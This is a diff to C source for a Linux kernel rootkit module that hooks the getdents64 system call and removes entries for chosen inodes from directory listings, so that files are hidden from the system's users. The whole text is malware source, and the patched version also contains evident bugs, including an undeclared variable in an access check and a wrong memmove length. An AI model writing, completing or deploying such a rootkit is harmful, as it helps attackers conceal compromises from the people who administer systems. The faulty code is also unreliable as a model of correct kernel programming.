@@ -144,38 +144,39 @@ getdents64_ptr orig_getdents64;
 asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                  unsigned int count)
 {
-	int result, bp;
+	int actual_result, hacked_result, bp;
 	struct hidden_file *ptr;
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
-	struct linux_dirent64 *d, *d_next;
+	struct linux_dirent64 *d;
 
 	printk(KERN_INFO "Running hacked_getdents64\n");
 
 	// run real getdents64 
-	result = (*orig_getdents64)(fd,dirp,count);
+	actual_result = (*orig_getdents64)(fd,dirp,count);
+	hacked_result = actual_result;
 
 	// copy from user to kernelspace;
-	if (!access_ok(VERIFY_READ,dirp,result))
+	if (!access_ok(VERIFY_READ,dirp,actual_result))
 		return -1;
-	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
+	if ((kdirp = kmalloc(actual_result,GFP_KERNEL)) == NULL)
 		return -1;
-	if (copy_from_user((struct linux_dirent64 *)kdirp,dirp,result))
+	if (copy_from_user(kdirp,dirp,actual_result))
 		return -1;
 
 	// check result for files to hide
-	if (result > 0) { // actually read some bytes
+	if (actual_result > 0) { // actually read some bytes
 		printk(KERN_INFO "Checking dirp\n");
-		for (bp = 0; bp < result;) {
+		for (bp = 0; bp < actual_result;) {
 			d = (struct linux_dirent64 *) (kdirp + bp);
-			d_next = (struct linux_dirent64 *) (kdirp + bp + d->d_reclen);
+			//d_next = (struct linux_dirent64 *) (kdirp + bp + d->d_reclen);
 			list_for_each_entry(ptr,&hidden_files,list) {
 				if (d->d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
-					//memmove(kdirp + bp,kdirp + bp + d->d_reclen,
-					//        actual_result - bp + d->d_reclen);
-					//hacked_result -= d->d_reclen;
-					d->d_off += d_next->d_off;
-					d->d_reclen += d_next->d_reclen;
+					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					        actual_result - bp + d->d_reclen);
+					hacked_result -= d->d_reclen;
+					//d->d_off += d_next->d_off;
+					//d->d_reclen += d_next->d_reclen;
 				}
 			}
 			bp += d->d_reclen;
@@ -183,14 +184,14 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	}
 
 	// copy from kernel to userspace
-	if (!access_ok(VERIFY_WRITE,dirp,result))
+	if (!access_ok(VERIFY_WRITE,dirp,hacked))
 		return -1;
-	if (copy_to_user(dirp,(struct linux_dirent64 *)kdirp,result))
+	if (copy_to_user(dirp,kdirp,hacked_result))
 		return -1;
 	kfree(kdirp);
 
 	// return number of bytes read
-	return result;
+	return hacked_result;
 }
 
 int rootkit_init(void) {
